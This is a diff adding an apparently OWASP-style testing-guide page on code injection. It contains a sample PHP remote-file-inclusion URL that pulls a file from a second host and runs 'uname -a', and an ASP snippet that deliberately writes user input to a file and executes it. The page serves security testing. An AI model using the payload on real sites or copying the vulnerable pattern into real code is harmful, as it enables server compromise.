@@ -1,0 +1,55 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Code Injection</title>
+</head><body><b>Summary </b><br/>
+This section describes how a tester can check if it is possible to enter code as input on a web page and have it executed by the web server. <br/>
+<br/>
+&nbsp;In <a href="https://www.owasp.org/index.php/Code_Injection">Code Injection</a>&nbsp;testing, a tester submits input that is processed by the web server as dynamic code or as an included file. These tests can target various server-side scripting engines, e.g.., ASP or PHP. Proper input validation and secure coding practices need to be employed to protect against these attacks. <br/>
+<br/>
+<b>How to Test <br/>
+</b><b>Black Box testing </b><br/>
+<b>Testing for PHP Injection vulnerabilities </b><br/>
+Using the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included file: <br/>
+&nbsp;http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&amp;cmd=uname%20-a &nbsp;<br/>
+<br/>
+<b>Result Expected:</b>&nbsp;<br/>
+The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file. <br/>
+<br/>
+<br/>
+<b>Gray Box testing <br/>
+</b><b>Testing for ASP Code Injection vulnerabilities </b><br/>
+Examine ASP code for user input used in execution functions. Can the user enter commands into the Data input field? Here, the ASP code will save the input to a file and then execute it: <br/>
+&lt;%<br/>
+If not isEmpty(Request( "Data" ) ) Then<br/>
+Dim fso, f<br/>
+'User input Data is written to a file named data.txt<br/>
+Set fso = CreateObject("Scripting.FileSystemObject")<br/>
+Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)<br/>
+f.Write Request("Data") &amp; vbCrLf<br/>
+f.close<br/>
+Set f = nothing<br/>
+Set fso = Nothing<br/>
+<br/>
+'Data.txt is executed<br/>
+Server.Execute( "data.txt" )<br/>
+<br/>
+Else<br/>
+%&gt;<br/>
+&lt;form&gt;<br/>
+&lt;input name="Data" /&gt;&lt;input type="submit" name="Enter Data" /&gt;<br/>
+&lt;/form&gt;<br/>
+&lt;%<br/>
+End If<br/>
+%&gt;)))<br/>
+<br/>
+<br/>
+<b>References </b><ul><li>&nbsp;Security Focus - <a href="http://www.securityfocus.com">http://www.securityfocus.com</a></li>
+<li>&nbsp;Insecure.org - <a href="http://www.insecure.org">http://www.insecure.org</a></li>
+<li>&nbsp;Wikipedia - <a href="http://www.wikipedia.org">http://www.wikipedia.org</a></li>
+<li>&nbsp;Reviewing Code for <a href="https://www.owasp.org/index.php/OS_Injection">OS Injection</a>&nbsp;</li>
+</ul>
+&nbsp;<br/>
+<br/>
+</body></html>
